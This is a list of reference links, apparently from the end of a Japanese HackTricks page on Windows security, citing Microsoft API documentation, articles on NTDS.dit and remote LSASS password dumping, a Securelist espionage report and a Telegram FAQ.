- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows ハッキング: Microsoft システムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory のデータストアの実際の仕組み: NTDS.dit の内部 (第 1 部)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - リモートでの Lsass ダンプによるパスワード取得](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho が Still Toolkit でサイバースパイ活動の手段を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 関数と `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
